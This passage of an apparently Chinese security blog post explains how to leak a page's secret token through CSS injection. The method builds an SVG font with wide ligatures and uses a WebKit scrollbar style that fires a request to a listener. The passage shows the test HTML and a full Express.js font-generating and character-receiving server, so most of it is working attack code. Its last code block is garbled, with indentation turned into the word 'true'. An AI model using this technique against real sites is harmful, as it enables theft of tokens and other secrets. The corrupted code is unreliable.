class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"e"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"f"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"g"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"h"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"i"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"j"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"k"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"l"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"m"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"n"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"o"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"p"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"q"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"r"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"s"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"t"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"u"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"v"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"w"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"y"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"z"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">"sekurak"</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">"8000"</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M1 0z"</span>/&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;/<span class="hljs-name">defs</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>将以上代码保存为 test.svg，然后使用<code>fontforge ./script.fontforge test.svg</code>命令生成 test.woff ，我们再将其引入就好了。</p><p>这里我们做个简单的验证，将以下代码保存为 test.html</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-css">        <span class="hljs-keyword">@font-face</span> {</span></span><br><span class="line">            font-family: "hack";</span><br><span class="line">            src: url("./test.woff");</span><br><span class="line">        }</span><br><span class="line">        span {</span><br><span class="line">            background: lightblue;</span><br><span class="line">            font-family: "hack";</span><br><span class="line">        }</span><br><span class="line">        body {</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">body</span><span class="hljs-selector-pseudo">::-webkit-scrollbar</span> {</span></span><br><span class="line">            background: blue;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">body</span><span class="hljs-selector-pseudo">::-webkit-scrollbar</span><span class="hljs-selector-pseudo">:horizontal</span> {</span></span><br><span class="line">            background: url(http://127.0.0.1:9999);</span><br><span class="line">        }</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">span</span>&gt;</span>123sekurak123<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>然后用一个 font.html 用 iframe 将其引入:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/test.html"</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100px"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119230534.png" alt=""></p><p>访问 test.html 之后我们可以看到收到了请求。</p><p>这里的原理也比较简单，在基于 WebKit 或其分支之一的浏览器中，我们可以使用<code>-webkit-scrollbar</code>来设置滚动条样式，而出现滚动条样式，我们需要使用<code>nowrap</code>让其不换行。这里需要注意的是，如果要完全设置样式，先得添加伪类<code>-webkit-scrollbar</code>，这样才能利用连字的宽度来触发<code>-webkit-scrollbar:horizontal</code>属性来执行我们的请求。</p><h3 id="Token2-Get-From-JavaScript"><a href="#Token2-Get-From-JavaScript" class="headerlink" title="Token2 - Get From JavaScript"></a>Token2 - Get From JavaScript</h3><p>从上面这个 demo 我们大概就可以得到一个思路了，将所有字体也都设置为0，然后用连字的方法来爆破得到 token2</p><p>这里直接给出波兰那位作者的代码：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> app = express();</span><br><span class="line"><span class="hljs-comment">// Serwer ExprssJS domyślnie dodaje nagłówek ETag,</span></span><br><span class="line"><span class="hljs-comment">// ale nam nie jest to potrzebne, więc wyłączamy.</span></span><br><span class="line">app.disable(<span class="hljs-string">'etag'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">3001</span>;</span><br><span class="line"><span class="hljs-keyword">const</span> js2xmlparser = <span class="hljs-built_in">require</span>(<span class="hljs-string">'js2xmlparser'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> tmp = <span class="hljs-built_in">require</span>(<span class="hljs-string">'tmp'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> rimraf = <span class="hljs-built_in">require</span>(<span class="hljs-string">'rimraf'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> child_process = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Generujemy fonta dla zadanego przedrostka</span></span><br><span class="line"><span class="hljs-comment">// i znaków, dla których ma zostać utworzona ligatura.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createFont</span>(<span class="hljs-params">prefix, charsToLigature</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">let</span> font = {</span><br><span class="line">        <span class="hljs-string">"defs"</span>: {</span><br><span class="line">            <span class="hljs-string">"font"</span>: {</span><br><span class="line">                <span class="hljs-string">"@"</span>: {</span><br><span class="line">                    <span class="hljs-string">"id"</span>: <span class="hljs-string">"hack"</span>,</span><br><span class="line">                    <span class="hljs-string">"horiz-adv-x"</span>: <span class="hljs-string">"0"</span></span><br><span class="line">                },</span><br><span class="line">                <span class="hljs-string">"font-face"</span>: {</span><br><span class="line">                    <span class="hljs-string">"@"</span>: {</span><br><span class="line">                        <span class="hljs-string">"font-family"</span>: <span class="hljs-string">"hack"</span>,</span><br><span class="line">                        <span class="hljs-string">"units-per-em"</span>: <span class="hljs-string">"1000"</span></span><br><span class="line">                    }</span><br><span class="line">                },</span><br><span class="line">                <span class="hljs-string">"glyph"</span>: []</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    };</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// Domyślnie wszystkie możliwe znaki mają zerową szerokość...</span></span><br><span class="line">    <span class="hljs-keyword">let</span> glyphs = font.defs.font.glyph;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> c = <span class="hljs-number">0x20</span>; c &lt;= <span class="hljs-number">0x7e</span>; c += <span class="hljs-number">1</span>) {</span><br><span class="line">        <span class="hljs-keyword">const</span> glyph = {</span><br><span class="line">            <span class="hljs-string">"@"</span>: {</span><br><span class="line">                <span class="hljs-string">"unicode"</span>: <span class="hljs-built_in">String</span>.fromCharCode(c),</span><br><span class="line">                <span class="hljs-string">"horiz-adv-x"</span>: <span class="hljs-string">"0"</span>,</span><br><span class="line">                <span class="hljs-string">"d"</span>: <span class="hljs-string">"M1 0z"</span>,</span><br><span class="line">            }</span><br><span class="line">        };</span><br><span class="line">        glyphs.push(glyph);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// ... za wyjątkiem ligatur, które są BARDZO szerokie.</span></span><br><span class="line">    charsToLigature.forEach(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">const</span> glyph = {</span><br><span class="line">            <span class="hljs-string">"@"</span>: {</span><br><span class="line">                <span class="hljs-string">"unicode"</span>: prefix + c,</span><br><span class="line">                <span class="hljs-string">"horiz-adv-x"</span>: <span class="hljs-string">"10000"</span>,</span><br><span class="line">                <span class="hljs-string">"d"</span>: <span class="hljs-string">"M1 0z"</span>,</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        glyphs.push(glyph);</span><br><span class="line">    });</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// Konwertujemy JSON-a na SVG.</span></span><br><span class="line">    <span class="hljs-keyword">const</span> xml = js2xmlparser.parse(<span class="hljs-string">"svg"</span>, font);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// A następnie wykorzystujemy fontforge</span></span><br><span class="line">    <span class="hljs-comment">// do zamiany SVG na WOFF.</span></span><br><span class="line">    <span class="hljs-keyword">const</span> tmpobj = tmp.dirSync();</span><br><span class="line">    fs.writeFileSync(<span class="hljs-string">`<span class="hljs-subst">${tmpobj.name}</span>/font.svg`</span>, xml);</span><br><span class="line">    child_process.spawnSync(<span class="hljs-string">"/usr/bin/fontforge"</span>, [</span><br><span class="line">        <span class="hljs-string">`<span class="hljs-subst">${__dirname}</span>/script.fontforge`</span>,</span><br><span class="line">        <span class="hljs-string">`<span class="hljs-subst">${tmpobj.name}</span>/font.svg`</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">const</span> woff = fs.readFileSync(<span class="hljs-string">`<span class="hljs-subst">${tmpobj.name}</span>/font.woff`</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// Usuwamy katalog tymczasowy.</span></span><br><span class="line">    rimraf.sync(tmpobj.name);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// I zwracamy fonta w postaci WOFF.</span></span><br><span class="line">    <span class="hljs-keyword">return</span> woff;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Endpoint do generowania fontów.</span></span><br><span class="line">app.get(<span class="hljs-string">"/font/:prefix/:charsToLigature"</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-keyword">const</span> { prefix, charsToLigature } = req.params;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// Dbamy o to by font znalazł się w cache'u.</span></span><br><span class="line">    res.set({</span><br><span class="line">        <span class="hljs-string">'Cache-Control'</span>: <span class="hljs-string">'public, max-age=600'</span>,</span><br><span class="line">        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/font-woff'</span>,</span><br><span class="line">        <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'*'</span>,</span><br><span class="line">    });</span><br><span class="line">    </span><br><span class="line">    res.send(createFont(prefix, <span class="hljs-built_in">Array</span>.from(charsToLigature)));</span><br><span class="line">     </span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Endpoint do przyjmowania znaków przez połączenie zwrotne</span></span><br><span class="line">app.get(<span class="hljs-string">"/reverse/:chars"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>{</span><br><span class="line">    res.cookie(<span class="hljs-string">'chars'</span>, req.params.chars);</span><br><span class="line">    res.set(<span class="hljs-string">'Set-Cookie'</span>, <span class="hljs-string">`chars=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(req.params.chars)}</span>; Path=/`</span>);</span><br><span class="line">    res.send();</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/cookie.js'</span>, (req, res) =&gt; {</span><br><span class="line">trueres.sendFile(<span class="hljs-string">'js.cookie.js'</span>, {</span><br><span class="line">truetrueroot: <span class="hljs-string">'./node_modules/js-cookie/src/'</span></span><br><span class="line">true});</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/index.html'</span>, (req, res) =&gt; {</span><br><span class="line">trueres.sendFile(<span class="hljs-string">'index.html'</span>, {</span><br><span class="line">truetrueroot: <span class="hljs-string">'.'</span></span><br><span class="line">true});</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.listen(PORT, () =&gt; {</span><br><span class="line">true<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Listening on <span class="hljs-subst">${PORT}</span>...`</span>);</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我们先只用到<code>/font</code>的 